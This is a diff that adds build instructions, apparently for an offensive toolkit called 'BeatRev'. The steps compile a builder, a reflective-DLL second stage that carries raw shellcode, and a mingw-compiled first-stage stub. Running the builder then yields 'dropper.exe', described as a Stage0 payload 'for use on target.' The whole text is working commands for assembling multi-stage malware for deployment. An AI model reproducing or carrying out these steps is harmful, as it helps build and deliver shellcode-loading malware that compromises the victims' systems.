@@ -1,0 +1,7 @@
+1. Compile Builder using gcc -o builder src/Builder/BeatRevV2Builder.c
+2. Modify sc_length variable in src/Stage2/dll/src/ReflectiveDLL.c to match the length of raw shellcode file used with builder
+3. Compile Stage2 (in visual studio, ReflectiveDLL project uses some VS compiler-specific instructions
+4. Move compiled stage2stub.dll back to kali, modify src/Stage1/newstage1.c and define stage2size as the size of stage2stub
+5. Compile stage1stub using x86_64-w64-mingw32-gcc newstage1.c -o stage1stub.exe -s -DUNICODE -Os -L /usr/x86_64-w64-mingw32/lib -l:librpcrt4.a
+6. Run builder using syntax: ./builder src/Stage0/newstage0_exe.c x64 stage1stub.exe stage2stub.dll shellcode.bin
+7. Builder will produce dropper.exe.  This is a formatted and compiled Stage0 payload for use on target.
